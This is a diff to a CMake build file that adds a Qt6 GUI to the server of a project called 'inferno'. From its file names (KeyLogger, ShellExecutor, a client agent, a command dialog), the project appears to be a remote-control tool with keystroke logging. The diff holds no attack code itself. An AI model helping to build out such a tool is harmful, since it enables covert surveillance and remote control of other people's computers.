@@ -10,6 +10,15 @@ set(CMAKE_CXX_EXTENSIONS OFF)
 add_compile_options(-Wall -Wextra -Wpedantic -Werror)
 
 # ==========================================
+# 2. Qt Dependencies (Circle 4)
+# ==========================================
+set(CMAKE_AUTOMOC ON)
+set(CMAKE_AUTORCC ON)
+set(CMAKE_AUTOUIC ON)
+
+find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui)
+
+# ==========================================
 # 2. Common Library (Networking & Protocol)
 # ==========================================
 add_library(inferno_common STATIC
@@ -24,8 +33,16 @@ target_include_directories(inferno_common PUBLIC common/include)
 add_executable(inferno_server
     server/src/main.cpp
     server/src/server.cpp
+    server/src/MainWindow.cpp
+    server/src/DataStreamWidget.cpp
+    server/src/CommandDialog.cpp
+    server/include/server.hpp
+    server/include/MainWindow.hpp
+    server/include/DataStreamWidget.hpp
+    server/include/CommandDialog.hpp
+    server/resources/styles.qrc
 )
-target_link_libraries(inferno_server PRIVATE inferno_common)
+target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)
 
 # ==========================================
 # 4. Client Agent Executable 
@@ -57,11 +74,12 @@ add_executable(inferno_tests
     tests/shell_test.cpp
     tests/keylogger_test.cpp
     server/src/server.cpp
+    server/include/server.hpp
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
 )
-target_link_libraries(inferno_tests PRIVATE inferno_common)
+target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
 
 if(APPLE)
